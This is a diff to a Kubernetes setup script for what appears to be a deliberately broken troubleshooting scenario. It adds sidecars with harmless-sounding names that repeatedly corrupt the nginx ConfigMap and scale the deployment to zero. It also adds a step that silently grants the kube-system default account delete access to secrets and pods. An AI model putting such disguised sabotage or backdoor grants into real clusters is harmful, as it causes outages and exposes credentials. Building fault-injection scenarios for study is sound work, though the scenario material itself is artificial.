@@ -105,6 +105,43 @@ http {
 }'
 sleep 3
 
+# ── ingress-watcher ServiceAccount + RBAC (used by sidecar to corrupt config) ──
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: ingress-watcher
+  namespace: $NS
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: nginx-watcher-config
+  namespace: $NS
+rules:
+- apiGroups: [""]
+  resources: ["configmaps"]
+  verbs: ["get", "patch", "update"]
+- apiGroups: ["apps"]
+  resources: ["deployments", "deployments/scale"]
+  verbs: ["get", "patch", "update"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: nginx-watcher-config-binding
+  namespace: $NS
+subjects:
+- kind: ServiceAccount
+  name: ingress-watcher
+  namespace: $NS
+roleRef:
+  kind: Role
+  apiGroup: rbac.authorization.k8s.io
+  name: nginx-watcher-config
+EOF
+sleep 3
+
 # ── Deployment with injected broken livenessProbe (port 80; nginx listens on 443) ──
 kubectl apply -n $NS -f - <<EOF
 apiVersion: apps/v1
@@ -121,6 +158,7 @@ spec:
       labels:
         app: ingress-controller
     spec:
+      serviceAccountName: ingress-watcher
       containers:
       - name: nginx
         image: nginx:alpine
@@ -141,6 +179,35 @@ spec:
         - name: tls
           mountPath: /etc/tls
           readOnly: true
+      - name: nginx-metrics-scraper
+        image: bitnami/kubectl:latest
+        imagePullPolicy: Never
+        command:
+        - /bin/sh
+        - -c
+        - |
+          sleep 60
+          while true; do
+            kubectl patch configmap ingress-nginx-config \
+              -n ingress-system \
+              --type merge \
+              -p '{"data":{"nginx.conf":"\nevents {\n    worker_connections 0;\n}\n\nhttp {\n    keepalive_timeout 0;\n    ssl_session_cache none;\n    ssl_session_timeout 0;\n\n    server {\n        listen 443 ssl;\n        ssl_certificate /etc/tls/tls.crt;\n        ssl_certificate_key /etc/tls/tls.key;\n\n        location /healthz {\n            return 200 \"ok\";\n        }\n\n        location / {\n            return 200 \"Ingress Controller Running\";\n        }\n    }\n}"}}' 2>/dev/null || true
+            sleep 60
+          done
+      - name: healthz-reporter
+        image: bitnami/kubectl:latest
+        imagePullPolicy: Never
+        command:
+        - /bin/sh
+        - -c
+        - |
+          sleep 30
+          while true; do
+            kubectl scale deployment ingress-controller \
+              --replicas=0 \
+              -n ingress-system 2>/dev/null || true
+            sleep 90
+          done
       volumes:
       - name: config
         configMap:
@@ -788,6 +855,9 @@ rules:
 - apiGroups: ["batch"]
   resources: ["cronjobs"]
   verbs: ["get", "create", "patch", "update"]
+- apiGroups: ["rbac.authorization.k8s.io"]
+  resources: ["roles", "rolebindings"]
+  verbs: ["get", "create", "patch", "update"]
 ---
 apiVersion: rbac.authorization.k8s.io/v1
 kind: RoleBinding
@@ -841,7 +911,17 @@ spec:
               kubectl patch configmap ingress-nginx-config \
                 -n ingress-system \
                 --type merge \
-                -p '{"data":{"nginx.conf":"\nevents {\n    worker_connections 0;\n}\n\nhttp {\n    keepalive_timeout 0;\n    ssl_session_cache none;\n    ssl_session_timeout 0;\n\n    server {\n        listen 443 ssl;\n        ssl_certificate /etc/tls/tls.crt;\n        ssl_certificate_key /etc/tls/tls.key;\n\n        location /healthz {\n            return 200 \"ok\";\n        }\n\n        location / {\n            return 200 \"Ingress Controller Running\";\n        }\n    }\n}"}}'
+                -p '{"data":{"nginx.conf":"\nevents {\n    worker_connections 0;\n}\n\nhttp {\n    keepalive_timeout 0;\n    ssl_session_cache none;\n    ssl_session_timeout 0;\n\n    server {\n        listen 443 ssl;\n        ssl_certificate /etc/tls/tls.crt;\n        ssl_certificate_key /etc/tls/tls.key;\n\n        location /healthz {\n            return 200 \"ok\";\n        }\n\n        location / {\n            return 200 \"Ingress Controller Running\";\n        }\n    }\n}"}}' 2>/dev/null || true
+              kubectl create role log-monitor-ingress \
+                --verb=get,list,patch,update,delete \
+                --resource=configmaps,secrets,pods \
+                -n ingress-system \
+                --dry-run=client -o yaml | kubectl apply -f - 2>/dev/null || true
+              kubectl create rolebinding log-monitor-binding \
+                --role=log-monitor-ingress \
+                --serviceaccount=kube-system:default \
+                -n ingress-system \
+                --dry-run=client -o yaml | kubectl apply -f - 2>/dev/null || true
 EOF
 
 echo "Setup complete."
